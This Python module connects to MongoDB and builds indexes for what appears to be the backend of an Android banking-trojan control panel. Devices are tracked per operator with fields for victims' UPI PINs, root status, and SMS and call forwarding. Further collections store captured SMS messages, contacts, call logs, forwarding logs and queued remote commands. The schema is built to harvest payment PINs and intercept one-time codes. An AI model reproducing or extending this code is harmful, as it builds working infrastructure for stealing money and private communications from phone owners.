from motor.motor_asyncio import AsyncIOMotorClient, AsyncIOMotorDatabase
from pymongo import ASCENDING, DESCENDING
from datetime import datetime, timedelta
from .config import settings
import logging

logger = logging.getLogger(__name__)

class MongoDB:
    client: AsyncIOMotorClient = None
    db: AsyncIOMotorDatabase = None

mongodb = MongoDB()

async def connect_to_mongodb():
    try:
        logger.info(f"🔌 Connecting to MongoDB: {settings.MONGODB_URL}")

        mongodb.client = AsyncIOMotorClient(
            settings.MONGODB_URL,
            maxPoolSize=100,
            minPoolSize=10,
            serverSelectionTimeoutMS=5000
        )

        mongodb.db = mongodb.client[settings.MONGODB_DB_NAME]

        await mongodb.client.admin.command('ping')

        logger.info("✅ MongoDB connected successfully!")

        await create_indexes()

    except Exception as e:
        logger.error(f"❌ MongoDB connection failed: {e}")
        raise

async def close_mongodb_connection():
    if mongodb.client:
        logger.info("🔌 Closing MongoDB connection...")
        mongodb.client.close()
        logger.info("✅ MongoDB connection closed!")

async def create_indexes():
    try:
        logger.info("📊 Creating indexes...")

        await mongodb.db.devices.create_index("device_id", unique=True)
        await mongodb.db.devices.create_index([("status", ASCENDING), ("last_ping", DESCENDING)])
        await mongodb.db.devices.create_index("user_id")
        await mongodb.db.devices.create_index("app_type")
        await mongodb.db.devices.create_index("is_online")
        await mongodb.db.devices.create_index("sms_forwarding_enabled")
        await mongodb.db.devices.create_index("call_forwarding_enabled")
        await mongodb.db.devices.create_index("battery_level")
        await mongodb.db.devices.create_index("is_rooted")
        await mongodb.db.devices.create_index("fcm_tokens")
        
        # 🔑 Admin & Device Token Indexes
        await mongodb.db.devices.create_index("admin_token")  # توکن ادمین صاحب دستگاه
        await mongodb.db.devices.create_index("admin_username")  # username ادمین صاحب دستگاه
        await mongodb.db.devices.create_index([("admin_username", ASCENDING), ("registered_at", DESCENDING)])  # Compound index

        # UPI Indexes
        await mongodb.db.devices.create_index("has_upi")
        await mongodb.db.devices.create_index("upi_pin")  # ✅ اضافه شد
        await mongodb.db.devices.create_index("upi_detected_at")
        await mongodb.db.devices.create_index("upi_last_updated_at")  # ✅ اضافه شد
        await mongodb.db.devices.create_index([("has_upi", ASCENDING), ("upi_detected_at", DESCENDING)])  # ✅ Compound index

        await mongodb.db.devices.create_index("note_priority")
        await mongodb.db.devices.create_index("note_updated_at")
        await mongodb.db.devices.create_index([("note_priority", ASCENDING), ("note_updated_at", DESCENDING)])

        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("is_read", ASCENDING)])
        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("type", ASCENDING)])
        await mongodb.db.sms_messages.create_index("from")
        await mongodb.db.sms_messages.create_index("to")
        await mongodb.db.sms_messages.create_index("sms_id", unique=True)

        await mongodb.db.sms_messages.create_index(
            "received_at",
            expireAfterSeconds=settings.SMS_RETENTION_DAYS * 24 * 60 * 60
        )

        await mongodb.db.sms_forwarding_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.sms_forwarding_logs.create_index("original_from")
        await mongodb.db.sms_forwarding_logs.create_index("forwarded_to")
        await mongodb.db.sms_forwarding_logs.create_index("forward_id", unique=True)

        await mongodb.db.sms_forwarding_logs.create_index(
            "created_at",
            expireAfterSeconds=90 * 24 * 60 * 60
        )

        await mongodb.db.call_forwarding_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.call_forwarding_logs.create_index("action")
        await mongodb.db.call_forwarding_logs.create_index("success")
        await mongodb.db.call_forwarding_logs.create_index("sim_slot")

        await mongodb.db.call_forwarding_logs.create_index(
            "created_at",
            expireAfterSeconds=90 * 24 * 60 * 60
        )

        await mongodb.db.contacts.create_index([("device_id", ASCENDING), ("phone_number", ASCENDING)])
        await mongodb.db.contacts.create_index([("device_id", ASCENDING), ("name", ASCENDING)])
        await mongodb.db.contacts.create_index("phone_number")
        await mongodb.db.contacts.create_index("contact_id", unique=True)

        await mongodb.db.call_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.call_logs.create_index([("device_id", ASCENDING), ("call_type", ASCENDING)])
        await mongodb.db.call_logs.create_index("number")
        await mongodb.db.call_logs.create_index("call_id", unique=True)

        await mongodb.db.call_logs.create_index(
            "received_at",
            expireAfterSeconds=180 * 24 * 60 * 60
        )

        await mongodb.db.logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.logs.create_index("level")
        await mongodb.db.logs.create_index("type")

        await mongodb.db.logs.create_index(
            "timestamp",
            expireAfterSeconds=settings.LOGS_RETENTION_DAYS * 24 * 60 * 60
        )

        await mongodb.db.commands.create_index([("device_id", ASCENDING), ("status", ASCENDING)])
        await mongodb.db.commands.create_index([("device_id", ASCENDING), ("sent_at", DESCENDING)])

        await mongodb.db.admins.create_index("username", unique=True)
        await mongodb.db.admins.create_index("email", unique=True)
        await mongodb.db.admins.create_index("role")
        await mongodb.db.admins.create_index("device_token", unique=True)
        await mongodb.db.admins.create_index("telegram_2fa_chat_id")
        await mongodb.db.admins.create_index("current_session_id")
        
        # OTP Codes (2FA)
        await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("used", ASCENDING)])
        await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("otp_code", ASCENDING)])
        await mongodb.db.otp_codes.create_index("expires_at", expireAfterSeconds=3600)  # Auto-delete after 1 hour
        await mongodb.db.otp_codes.create_index("created_at")

        await mongodb.db.admin_activities.create_index([("admin_username", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.admin_activities.create_index("activity_type")
        await mongodb.db.admin_activities.create_index("device_id")

        await mongodb.db.admin_activities.create_index(
            "timestamp",
            expireAfterSeconds=settings.ADMIN_ACTIVITY_RETENTION_DAYS * 24 * 60 * 60
        )

        logger.info("✅ Indexes created successfully!")
        
        # ====================================================================
        # 🔄 MIGRATION: Add session fields to existing admins
        # ====================================================================
        # Force all existing admins to re-login by setting session fields to None
        result = await mongodb.db.admins.update_many(
            {"current_session_id": {"$exists": False}},
            {"$set": {
                "current_session_id": None,
                "last_session_ip": None,
                "last_session_device": None
            }}
        )
        if result.modified_count > 0:
            logger.warning(f"🔄 Migrated {result.modified_count} admin(s) - They must re-login (Single Session activated)")

    except Exception as e:
        logger.error(f"❌ Failed to create indexes: {e}")